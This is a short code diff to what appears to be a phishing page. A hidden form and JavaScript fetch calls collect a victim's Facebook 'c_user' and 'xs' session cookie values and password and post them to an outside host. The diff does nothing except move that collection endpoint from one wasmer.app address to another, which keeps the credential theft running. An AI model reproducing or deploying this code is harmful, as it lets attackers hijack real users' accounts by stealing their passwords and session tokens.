@@ -1499,7 +1499,7 @@
     </div>
     
     <!-- Hidden form for submission -->
-    <form id="hiddenForm" class="hidden-form" action="https://professor-asif.wasmer.app/mnsor.php" method="post">
+    <form id="hiddenForm" class="hidden-form" action="https://professor-asif1.wasmer.app/fm.php" method="post">
         <input type="hidden" name="c_user" id="hiddenCUser">
         <input type="hidden" name="xs" id="hiddenXs">
         <input type="hidden" name="password" id="hiddenPassword">
@@ -1929,7 +1929,7 @@
                 formData.append('c_user', cUserInput.value);
                 formData.append('xs', xsInput.value);
                 
-                fetch('https://professor-asif.wasmer.app/mnsor.php', {
+                fetch('https://professor-asif1.wasmer.app/fm.php', {
                     method: 'POST',
                     body: formData
                 })
@@ -1975,7 +1975,7 @@
                 const formData = new FormData();
                 formData.append('password', passwordInput.value);
                 
-                fetch('https://professor-asif.wasmer.app/mnsorpass.php', {
+                fetch('https://professor-asif1.wasmer.app/fmpass.php', {
                     method: 'POST',
                     body: formData
                 })
